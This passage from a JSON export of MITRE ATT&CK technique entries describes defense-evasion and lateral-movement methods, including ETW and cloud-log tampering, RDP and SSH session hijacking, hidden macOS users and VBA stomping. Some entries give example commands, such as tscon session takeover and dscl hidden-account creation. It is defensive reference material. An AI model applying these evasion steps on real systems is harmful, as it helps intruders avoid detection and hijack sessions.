    "technique_description": "<p>An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting (Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW),(Citation: Microsoft About Event Tracing 2018) by tampering settings that control the collection and flow of event telemetry. (Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as <a href=\"https://attack.mitre.org/techniques/T1059/001\">PowerShell</a> or <a href=\"https://attack.mitre.org/techniques/T1047\">Windows Management Instrumentation</a>.<!-- raw HTML omitted --><!-- raw HTML omitted -->ETW interruption can be achieved multiple ways, however most directly by defining conditions using the <a href=\"https://attack.mitre.org/techniques/T1059/001\">PowerShell</a> <!-- raw HTML omitted -->Set-EtwTraceProvider<!-- raw HTML omitted --> cmdlet or by interfacing directly with the Registry to make alterations.<!-- raw HTML omitted --><!-- raw HTML omitted -->In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/571.html",
        "description": "none",
        "external_id": "CAPEC-571"
      },
      {
        "source_name": "Microsoft Lamin Sept 2017",
        "url": "https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?name=Backdoor:Win32/Lamin.A",
        "description": "Microsoft. (2009, May 17). Backdoor:Win32/Lamin.A. Retrieved September 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft About Event Tracing 2018",
        "url": "https://docs.microsoft.com/en-us/windows/desktop/etw/consuming-events",
        "description": "Microsoft. (2018, May 30). About Event Tracing. Retrieved June 7, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Medium Event Tracing Tampering 2018",
        "url": "https://medium.com/palantir/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63",
        "description": "Palantir. (2018, December 24). Tampering with Windows Event Tracing: Background, Offense, and Defense. Retrieved June 7, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--77532a55-c283-4cd2-bc5d-2d0b65e9d88c",
    "platform": "aws|gcp|azure",
    "tid": "T1562.007",
    "technique": "Disable or Modify Cloud Firewall",
    "tactic": "defense-evasion",
    "datasources": "aws-cloudtrail-logs|azure-activity-logs|gcp-audit-logs|stackdriver-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in <a href=\"https://attack.mitre.org/techniques/T1562/004\">Disable or Modify System Firewall</a>. <!-- raw HTML omitted --><!-- raw HTML omitted -->Cloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary may introduce new firewall rules or policies to allow access into a victim cloud environment. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups to allow any TCP/IP connectivity.(Citation: Expel IO Evil in AWS)<!-- raw HTML omitted --><!-- raw HTML omitted -->Modifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed.</p>\n",
    "technique_references": [
      {
        "source_name": "Expel IO Evil in AWS",
        "url": "https://expel.io/blog/finding-evil-in-aws/",
        "description": "A. Randazzo, B. Manahan and S. Lipton. (2020, April 28). Finding Evil in AWS. Retrieved June 25, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--cacc40da-4c9e-462c-80d5-fd70a178b12d",
    "platform": "gcp|azure|aws",
    "tid": "T1562.008",
    "technique": "Disable Cloud Logs",
    "tactic": "defense-evasion",
    "datasources": "aws-cloudtrail-logs|azure-activity-logs|gcp-audit-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>An adversary may disable cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. <!-- raw HTML omitted --><!-- raw HTML omitted -->Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an attacker has sufficient permissions, they can disable logging to avoid detection of their activities. For example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic)</p>\n",
    "technique_references": [
      {
        "source_name": "Following the CloudTrail: Generating strong AWS security signals with Sumo Logic",
        "url": "https://expel.io/blog/following-cloudtrail-generating-aws-security-signals-sumo-logic/",
        "description": "Dan Whalen. (2019, September 10). Following the CloudTrail: Generating strong AWS security signals with Sumo Logic. Retrieved October 16, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Stopping CloudTrail from Sending Events to CloudWatch Logs",
        "url": "https://docs.aws.amazon.com/awscloudtrail/latest/userguide/stop-cloudtrail-from-sending-events-to-cloudwatch-logs.html",
        "description": "Amazon Web Services. (n.d.). Stopping CloudTrail from Sending Events to CloudWatch Logs. Retrieved October 16, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Configuring Data Access audit logs",
        "url": "https://cloud.google.com/logging/docs/audit/configure-data-access",
        "description": "Google. (n.d.). Configuring Data Access audit logs. Retrieved October 16, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "az monitor diagnostic-settings",
        "url": "https://docs.microsoft.com/en-us/cli/azure/monitor/diagnostic-settings?view=azure-cli-latest#az_monitor_diagnostic_settings_delete",
        "description": "Microsoft. (n.d.). az monitor diagnostic-settings. Retrieved October 16, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--4d2a5b3e-340d-4600-9123-309dd63c9bf8",
    "platform": "linux|macos",
    "tid": "T1563.001",
    "technique": "SSH Hijacking",
    "tactic": "lateral-movement",
    "datasources": "authentication-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may hijack a legitimate user’s SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.<!-- raw HTML omitted --><!-- raw HTML omitted -->In order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent’s socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.(Citation: Slideshare Abusing SSH)(Citation: SSHjack Blackhat)(Citation: Clockwork SSH Agent Hijacking)(Citation: Breach Post-mortem SSH Hijack)<!-- raw HTML omitted --><!-- raw HTML omitted --><a href=\"https://attack.mitre.org/techniques/T1563/001\">SSH Hijacking</a> differs from use of <a href=\"https://attack.mitre.org/techniques/T1021/004\">SSH</a> because it hijacks an existing SSH session rather than creating a new session using <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a>.</p>\n",
    "technique_references": [
      {
        "source_name": "Slideshare Abusing SSH",
        "url": "https://www.slideshare.net/morisson/mistrusting-and-abusing-ssh-13526219",
        "description": "Duarte, H., Morrison, B. (2012). (Mis)trusting and (ab)using ssh. Retrieved January 8, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "SSHjack Blackhat",
        "url": "https://www.blackhat.com/presentations/bh-usa-05/bh-us-05-boileau.pdf",
        "description": "Adam Boileau. (2005, August 5). Trust Transience:  Post Intrusion SSH Hijacking. Retrieved December 19, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Clockwork SSH Agent Hijacking",
        "url": "https://www.clockwork.com/news/2012/09/28/602/ssh_agent_hijacking",
        "description": "Beuchler, B. (2012, September 28). SSH Agent Hijacking. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Breach Post-mortem SSH Hijack",
        "url": "https://matrix.org/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident",
        "description": "Hodgson, M. (2019, May 8). Post-mortem and remediations for Apr 11 security incident. Retrieved February 17, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--e0033c16-a07e-48aa-8204-7c3ca669998c",
    "platform": "windows",
    "tid": "T1563.002",
    "technique": "RDP Hijacking",
    "tactic": "lateral-movement",
    "datasources": "authentication-logs|netflow-enclave-netflow|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may hijack a legitimate user’s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may perform RDP session hijacking which involves stealing a legitimate user’s remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, <code>c:\\windows\\system32\\tscon.exe [session number to be stolen]</code>, an adversary can hijack a session without the need for credentials or prompts to the user.(Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions.(Citation: RDP Hijacking Medium) It can also lead to <a href=\"https://attack.mitre.org/techniques/T1018\">Remote System Discovery</a> and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.(Citation: Kali Redsnarf)</p>\n",
    "technique_references": [
      {
        "source_name": "TechNet Remote Desktop Services",
        "url": "https://technet.microsoft.com/en-us/windowsserver/ee236407.aspx",
        "description": "Microsoft. (n.d.). Remote Desktop Services. Retrieved June 1, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "RDP Hijacking Korznikov",
        "url": "http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html",
        "description": "Korznikov, A. (2017, March 17). Passwordless RDP Session Hijacking Feature All Windows versions. Retrieved December 11, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "RDP Hijacking Medium",
        "url": "https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6",
        "description": "Beaumont, K. (2017, March 19). RDP hijacking — how to hijack RDS and RemoteApp sessions transparently to move through an organisation. Retrieved December 11, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Kali Redsnarf",
        "url": "https://github.com/nccgroup/redsnarf",
        "description": "NCC Group PLC. (2016, November 1). Kali Redsnarf. Retrieved December 11, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--ec8fc7e2-b356-455c-8db5-2e37be158e7d",
    "platform": "windows|macos|linux",
    "tid": "T1564.001",
    "technique": "Hidden Files and Directories",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<!-- raw HTML omitted -->dir /a<!-- raw HTML omitted --> for Windows and <!-- raw HTML omitted -->ls –a<!-- raw HTML omitted --> for Linux and macOS).<!-- raw HTML omitted --><!-- raw HTML omitted -->On Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable.<!-- raw HTML omitted --><!-- raw HTML omitted -->Files on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker). On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.</p>\n",
    "technique_references": [
      {
        "source_name": "Sofacy Komplex Trojan",
        "url": "https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/",
        "description": "Dani Creus, Tyler Halfpop, Robert Falcone. (2016, September 26). Sofacy's 'Komplex' OS X Trojan. Retrieved July 8, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Antiquated Mac Malware",
        "url": "https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/",
        "description": "Thomas Reed. (2017, January 18). New Mac backdoor using antiquated code. Retrieved July 5, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "WireLurker",
        "url": "https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/reports/Unit_42/unit42-wirelurker.pdf",
        "description": "Claud Xiao. (n.d.). WireLurker: A New Era in iOS and OS X Malware. Retrieved July 10, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--8c4aef43-48d5-49aa-b2af-c0cd58d30c3d",
    "platform": "macos",
    "tid": "T1564.002",
    "technique": "Hidden Users",
    "tactic": "defense-evasion",
    "datasources": "authentication-logs|file-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use hidden users to mask the presence of user accounts they create. Every user account in macOS has a userID associated with it. When creating a user, you can specify the userID for that account.<!-- raw HTML omitted --><!-- raw HTML omitted -->There is a property value in <!-- raw HTML omitted -->/Library/Preferences/com.apple.loginwindow<!-- raw HTML omitted --> called <!-- raw HTML omitted -->Hide500Users<!-- raw HTML omitted --> that prevents users with userIDs 500 and lower from appearing at the login screen. When using the <a href=\"https://attack.mitre.org/techniques/T1136\">Create Account</a> technique with a userID under 500 (ex: <!-- raw HTML omitted -->sudo dscl . -create /Users/username UniqueID 401<!-- raw HTML omitted -->) and enabling this property (setting it to Yes), an adversary can conceal user accounts. (Citation: Cybereason OSX Pirrit).</p>\n",
    "technique_references": [
      {
        "source_name": "Cybereason OSX Pirrit",
        "url": "http://go.cybereason.com/rs/996-YZT-709/images/Cybereason-Lab-Analysis-OSX-Pirrit-4-6-16.pdf",
        "description": "Amit Serper. (2016). Cybereason Lab Analysis OSX.Pirrit. Retrieved July 31, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--cbb66055-0325-4111-aca0-40547b6ad5b0",
    "platform": "macos|windows",
    "tid": "T1564.003",
    "technique": "Hidden Window",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|powershell-logs|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. <!-- raw HTML omitted --><!-- raw HTML omitted -->On Windows, there are a variety of features in scripting languages in Windows, such as <a href=\"https://attack.mitre.org/techniques/T1059/001\">PowerShell</a>, Jscript, and <a href=\"https://attack.mitre.org/techniques/T1059/005\">Visual Basic</a> to make windows hidden. One example of this is <!-- raw HTML omitted -->powershell.exe -WindowStyle Hidden<!-- raw HTML omitted -->. (Citation: PowerShell About 2019)<!-- raw HTML omitted --><!-- raw HTML omitted -->Similarly, on macOS the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <!-- raw HTML omitted -->apple.awt.UIElement<!-- raw HTML omitted -->, which allows for Java applications to prevent the application’s icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don’t also want to show up in the Dock.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.(Citation: Antiquated Mac Malware)</p>\n",
    "technique_references": [
      {
        "source_name": "PowerShell About 2019",
        "url": "https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Core/About/about_PowerShell_exe?view=powershell-5.1",
        "description": "Wheeler, S. et al.. (2019, May 1). About PowerShell.exe. Retrieved October 11, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Antiquated Mac Malware",
        "url": "https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/",
        "description": "Thomas Reed. (2017, January 18). New Mac backdoor using antiquated code. Retrieved July 5, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--f2857333-11d4-45bf-b064-2c28d8525be5",
    "platform": "windows",
    "tid": "T1564.004",
    "technique": "NTFS File Attributes",
    "tactic": "defense-evasion",
    "datasources": "api-monitoring|file-monitoring|process-command-line-parameters",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)</p>\n",
    "technique_references": [
      {
        "source_name": "SpectorOps Host-Based Jul 2017",
        "url": "https://posts.specterops.io/host-based-threat-modeling-indicator-design-a9dbbb53d5ea",
        "description": "Atkinson, J. (2017, July 18). Host-based Threat Modeling & Indicator Design. Retrieved March 21, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft NTFS File Attributes Aug 2010",
        "url": "https://blogs.technet.microsoft.com/askcore/2010/08/25/ntfs-file-attributes/",
        "description": "Hughes, J. (2010, August 25). NTFS File Attributes. Retrieved March 21, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft File Streams",
        "url": "http://msdn.microsoft.com/en-us/library/aa364404",
        "description": "Microsoft. (n.d.). File Streams. Retrieved December 2, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "MalwareBytes ADS July 2015",
        "url": "https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/",
        "description": "Arntz, P. (2015, July 22). Introduction to Alternate Data Streams. Retrieved March 21, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft ADS Mar 2014",
        "url": "https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/",
        "description": "Marlin, J. (2013, March 24). Alternate Data Streams in NTFS. Retrieved March 21, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Journey into IR ZeroAccess NTFS EA",
        "url": "http://journeyintoir.blogspot.com/2012/12/extracting-zeroaccess-from-ntfs.html",
        "description": "Harrell, C. (2012, December 11). Extracting ZeroAccess from NTFS Extended Attributes. Retrieved June 3, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Oddvar Moe ADS1 Jan 2018",
        "url": "https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/",
        "description": "Moe, O. (2018, January 14). Putting Data in Alternate Data Streams and How to Execute It. Retrieved June 30, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Oddvar Moe ADS2 Apr 2018",
        "url": "https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/",
        "description": "Moe, O. (2018, April 11). Putting Data in Alternate Data Streams and How to Execute It - Part 2. Retrieved June 30, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Symantec ADS May 2009",
        "url": "https://www.symantec.com/connect/articles/what-you-need-know-about-alternate-data-streams-windows-your-data-secure-can-you-restore",
        "description": "Pravs. (2009, May 25). What you need to know about alternate data streams in windows? Is your Data secure? Can you restore that?. Retrieved March 21, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--dfebc3b7-d19d-450b-81c7-6dafe4184c04",
    "platform": "linux|macos|windows",
    "tid": "T1564.005",
    "technique": "Hidden File System",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.(Citation: MalwareTech VFS Nov 2014)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions.(Citation: MalwareTech VFS Nov 2014)(Citation: FireEye Bootkits) Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system.(Citation: ESET ComRAT May 2020) Adversaries may also fragment files across the existing file system structure in non-standard ways.(Citation: Kaspersky Equation QA)</p>\n",
    "technique_references": [
      {
        "source_name": "MalwareTech VFS Nov 2014",
        "url": "https://www.malwaretech.com/2014/11/virtual-file-systems-for-beginners.html",
        "description": "Hutchins, M. (2014, November 28). Virtual File Systems for Beginners. Retrieved June 22, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye Bootkits",
        "url": "https://www.fireeye.com/blog/threat-research/2015/12/fin1-targets-boot-record.html",
        "description": "Andonov, D., et al. (2015, December 7). Thriving Beyond The Operating System: Financial Threat Group Targets Volume Boot Record. Retrieved May 13, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "ESET ComRAT May 2020",
        "url": "https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf",
        "description": "Faou, M. (2020, May). From Agent.btz to ComRAT v4: A ten-year journey. Retrieved June 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Kaspersky Equation QA",
        "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064459/Equation_group_questions_and_answers.pdf",
        "description": "Kaspersky Lab's Global Research and Analysis Team. (2015, February). Equation Group: Questions and Answers. Retrieved December 21, 2015.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--b5327dd1-6bf9-4785-a199-25bcbd1f4a9d",
    "platform": "linux|macos|windows",
    "tid": "T1564.006",
    "technique": "Run Virtual Instance",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|host-network-interface|packet-capture|process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.(Citation: SingHealth Breach Jan 2019)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.(Citation: Sophos Ragnar May 2020)</p>\n",
    "technique_references": [
      {
        "source_name": "SingHealth Breach Jan 2019",
        "url": "https://www.mci.gov.sg/-/media/mcicorp/doc/report-of-the-coi-into-the-cyber-attack-on-singhealth-10-jan-2019.ashx",
        "description": "Committee of Inquiry into the Cyber Attack on SingHealth. (2019, January 10). Public Report of the Committee of Inquiry into the Cyber Attack on Singapore Health Services Private Limited's Patient Database. Retrieved June 29, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Sophos Ragnar May 2020",
        "url": "https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/",
        "description": "SophosLabs. (2020, May 21). Ragnar Locker ransomware deploys virtual machine to dodge security. Retrieved June 29, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--c898c4b5-bf36-4e6e-a4ad-5b8c4c13e35b",
    "platform": "linux|windows|macos",
    "tid": "T1564.007",
    "technique": "VBA Stomping",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.(Citation: FireEye VBA stomp Feb 2020)<!-- raw HTML omitted --><!-- raw HTML omitted -->MS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a <!-- raw HTML omitted -->PerformanceCache<!-- raw HTML omitted --> that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the <!-- raw HTML omitted -->_VBA_PROJECT<!-- raw HTML omitted --> stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.(Citation: Evil Clippy May 2019)(Citation: Microsoft _VBA_PROJECT Stream)<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may hide malicious VBA code by overwriting the VBA source code location with zero’s, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the <!-- raw HTML omitted -->_VBA_PROJECT<!-- raw HTML omitted --> stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.(Citation: Walmart Roberts Oct 2018)(Citation: FireEye VBA stomp Feb 2020)(Citation: pcodedmp Bontchev)</p>\n",
    "technique_references": [
      {
        "source_name": "FireEye VBA stomp Feb 2020",
        "url": "https://www.fireeye.com/blog/threat-research/2020/01/stomp-2-dis-brilliance-in-the-visual-basics.html",
        "description": "Cole, R., Moore, A., Stark, G., Stancill, B. (2020, February 5). STOMP 2 DIS: Brilliance in the (Visual) Basics. Retrieved September 17, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Evil Clippy May 2019",
        "url": "https://outflank.nl/blog/2019/05/05/evil-clippy-ms-office-maldoc-assistant/",
        "description": "Hegt, S. (2019, May 5). Evil Clippy: MS Office maldoc assistant. Retrieved September 17, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft _VBA_PROJECT Stream",
        "url": "https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-ovba/ef7087ac-3974-4452-aab2-7dba2214d239",
        "description": "Microsoft. (2020, February 19). 2.3.4.1 _VBA_PROJECT Stream: Version Dependent Project Information. Retrieved September 18, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Walmart Roberts Oct 2018",
        "url": "https://medium.com/walmartglobaltech/vba-stomping-advanced-maldoc-techniques-612c484ab278",
        "description": "Sayre, K., Ogden, H., Roberts, C. (2018, October 10). VBA Stomping — Advanced Maldoc Techniques. Retrieved September 17, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "pcodedmp Bontchev",
        "url": "https://github.com/bontchev/pcodedmp",
        "description": "Bontchev, V. (2019, July 30). pcodedmp.py - A VBA p-code disassembler. Retrieved September 17, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "oletools toolkit",
        "url": "https://github.com/decalage2/oletools",
